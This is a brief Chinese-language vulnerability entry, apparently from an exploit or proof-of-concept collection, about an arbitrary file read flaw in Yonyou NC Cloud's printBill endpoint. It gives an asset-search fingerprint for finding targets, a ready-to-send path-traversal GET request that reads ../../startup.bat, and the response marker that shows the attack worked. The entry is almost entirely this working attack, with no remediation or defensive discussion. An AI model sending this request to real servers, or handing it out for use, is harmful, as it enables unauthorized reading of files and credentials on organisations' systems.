# 用友NCprintBill任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1`
- **响应特征**：200 HOME